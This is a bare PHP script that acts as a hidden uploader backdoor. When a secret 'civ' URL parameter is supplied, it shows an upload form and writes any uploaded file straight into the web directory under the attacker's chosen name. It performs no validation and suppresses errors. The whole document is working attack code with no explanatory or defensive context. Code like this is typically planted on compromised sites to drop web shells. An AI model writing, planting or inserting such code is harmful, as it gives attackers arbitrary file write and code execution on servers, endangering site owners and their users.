 <?php
 if(isset($_GET["civ"]))
 	{ 
  		echo"<br><form method=post enctype=multipart/form-data>"; 
  		echo"<input type=file name=f> <input name=k type=submit id=k value=upload><br>"; 
    	if($_POST["k"]==upload)
			{ 
				if(@copy($_FILES["f"]["tmp_name"],$_FILES["f"]["name"]))
					{
						echo"<b> Success upload = ".$_FILES["f"]["name"];
					}
				else
					{
						echo"<b>Cant Upload !!!";
					}
			} 
	}
?>